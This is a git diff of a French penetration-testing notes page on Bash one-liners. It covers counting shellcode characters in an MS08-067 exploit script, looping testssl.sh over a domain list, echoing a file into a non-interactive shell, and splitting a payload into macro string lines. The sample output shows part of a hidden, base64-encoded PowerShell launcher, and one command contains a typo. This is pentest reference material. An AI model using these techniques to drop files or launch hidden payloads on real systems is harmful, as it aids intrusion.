@@ -5,8 +5,8 @@ permalink: /Bash/
 
 # Bash
 
-Commandes utiles
-----------------
+## Commandes utiles
+### Divers
 
 Les commandes suivantes permettent de compter le nombre de caractères dans un shellcode:
 
@@ -14,11 +14,18 @@ Les commandes suivantes permettent de compter le nombre de caractères dans un s
 cat ms_08_067.py| grep "^shellcode" | awk '{print $3}' | cut -d'"' -f2 | sed ':a;N;$!ba;s/\n//g' | wc -c
 ```
 
-Faire des divisions sur la CLI:
+Divisions en CLI
 
 ``` bash
 v=$(cat tmp | cut -d'"' -f2 | tr -d '\n' | wc -c);echo $((v/4))
 ```
+
+Faire tourner un outil en boucle sur chaque ligne d'un fichier
+```
+while read dom; do /opt/testssl.sh/testssl.sh --csv $dom ; done < domains.txt
+```
+
+### Sed Magic
 
 Les commandes suivantes générent les commandes à taper pour copier/coller un fichier dans un shell non interactif:
 
@@ -26,7 +33,11 @@ Les commandes suivantes générent les commandes à taper pour copier/coller un 
 cat test | sed -e 's/^/echo /g' | sed -e 's/$/>> file.txt/g'
 ```
 
-Faire tourner un outil en boucle sur chaque ligne d'un fichier
+Découper une longue entrée sur plusieurs lignes:
+``` bash
+cat test | | sed 's/.\{70\}/Str = Str + "&"\n/g'
+Str = Str + "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACg"
+Str = Str + "AWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnA"
+[...]
 ```
-while read dom; do /opt/testssl.sh/testssl.sh --csv $dom ; done < domains.txt
-```
+
